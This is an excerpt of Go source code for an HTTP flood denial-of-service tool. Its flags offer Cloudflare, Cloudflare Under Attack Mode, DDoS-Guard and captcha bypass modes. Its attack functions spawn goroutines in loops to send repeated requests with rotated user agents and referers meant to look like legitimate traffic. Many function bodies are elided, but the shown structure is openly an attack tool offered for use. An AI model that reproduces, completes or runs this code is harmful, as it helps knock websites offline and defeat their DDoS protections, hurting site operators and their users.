...
func main() {
	...
	flag.BoolVar(&cfb, "cfb", false, "CloudFlare Bypass")
	flag.BoolVar(&cfbuam, "cfbuam", false, " CloudFlare Under Attack Mode Bypass")
	flag.BoolVar(&bypass, "bypass", false, " Bypass Normal AntiDDoS.")
	flag.BoolVar(&dgb, "dgb", false, "DDoS Guard Bypass.")
	flag.BoolVar(&stomp, "stomp", false, "Bypass chk_captcha.")
	flag.Parse()
	...
	go func() {
		...
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				if cfb {
					go cfbAttack(site, u.Host, data, headers, ss)
				} else if cfbuam {
					go cfbuamAttack(site, u.Host, data, headers, ss)
				} else if bypass {
					go bypassAttack(site, u.Host, data, headers, ss)
				} else if dgb {
					go dgbAttack(site, u.Host, data, headers, ss)
				} else if stomp {
					go stompAttack(site, u.Host, data, headers, ss)
				} else {
...
func bypassAttack(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
	...
	for {
		...
		// Adding more legitimate-looking headers
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", "gzip, deflate")
		q.Header.Set("Pragma", "no-cache")
		q.Header.Set("DNT", "1") // Mimics Do Not Track request
...
func dgbAttack(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		for i := 0; i < 100; i++ { // Spawning multiple goroutines
			go func() {
				q, err := http.NewRequest("GET", requestURL, nil)
				if err != nil {
					s <- callExitOnErr
...
func stompAttack(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
...
func cfbAttack(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
...
func cfbuamAttack(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
